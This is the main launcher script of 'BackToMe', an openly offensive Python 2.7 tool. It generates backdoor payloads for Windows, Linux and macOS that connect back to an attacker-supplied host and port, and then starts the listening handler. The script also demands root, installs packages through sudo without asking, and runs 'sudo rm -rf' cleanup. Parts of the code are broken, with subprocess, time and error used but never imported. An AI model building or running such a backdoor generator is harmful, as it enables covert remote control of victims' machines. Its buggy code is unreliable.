#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import os
import sys
import argparse
import core.handler as handler
import core.generator as gen
from argparse import RawTextHelpFormatter
from core.banners import get_banner
try:
    import pip
except:
    os.system('sudo apt-get install python-pip -y')
if os.getuid() != 0:
    print "\033[1;31mYou Need To Be Root!\033[1;31m"
    exit()
try:
    from termcolor import colored
except:
    pip.main(['install', 'termcolor'])
    from termcolor import colored
################
windows = False
linux = False
macos = False
raw = False
name = 'backdoored'
################

author = colored('H0nus','red',attrs=['bold'])
email= colored('h0nus-apt[at]protonmail[dot]com','yellow',attrs=['bold'])
version = colored('v1.0','white')

if os.getuid() != 0:
    print "\033[1;31mYou Need To Be Root!\033[1;31m"
    exit()

def cleanup():
    subprocess.Popen("sudo rm -rf *.spec",shell=True)
    subprocess.Popen("sudo rm -rf build/",shell=True)
def main():
    global windows
    global linux
    global macos
    global raw
    global name
    try:
        print get_banner()
        parser = argparse.ArgumentParser(description="BackToMe v{}".format(version),
                                     version="{}".format(version),
                                     usage='sudo backtome.py -s HOST [opzioni]',
                                     epilog="\033[1;31mYou'll always come back to me\033[1;31m",
                                     formatter_class=RawTextHelpFormatter)

        sgroup = parser.add_argument_group("Options for BackToMe")
        sgroup.add_argument("-s", "--server", dest='host',type=str, required=True, help="Host per l'handler")
        sgroup.add_argument("-p", "--port", dest='port',type=str, default="2227", help="Porta da usare")
        sgroup.add_argument("--configure", action='store_true', help="Configura e non generare")
        sgroup.add_argument("--generate", action='store_true', help="Genera payload")
        sgroup.add_argument("--windows", action="store_true", help="Genera payload per Windows")
        sgroup.add_argument("--osx", action="store_true",  help="Genera payload per Mac OSX")
        sgroup.add_argument("--linux", action="store_true", help="Genera payload per Linux")
        sgroup.add_argument("--all", action="store_true", help="Genera payload per tutti gli OS")
        sgroup.add_argument("--raw", action="store_true", help="Genera raw payload")
        sgroup.add_argument("-n", "--name", dest='name',type=str, default="backdoored", help="Nome del file")
        if len(sys.argv) == 1:
            parser.print_help()
            sys.exit(1)
        options = parser.parse_args()
        if options.windows:
            windows = True
        if options.linux:
            linux = True
        if options.osx:
            macos = True
        if options.raw:
            raw = True
        if options.all:
            windows = True
            linux = True
            macos = True
        if options.configure:
            gen.configure(options.host,options.port)
        if options.generate:
            gen.configure(options.host,options.port)
            gen.generate(windows,linux,macos,raw,options.name)
        handler.startall(options.host,options.port)
        cleanup()
    except KeyboardInterrupt:
        print ""
        error("CTRL + C Detected, quitting...")
        time.sleep(1)
        cleanup()
        exit()
if __name__ == '__main__':
    main()
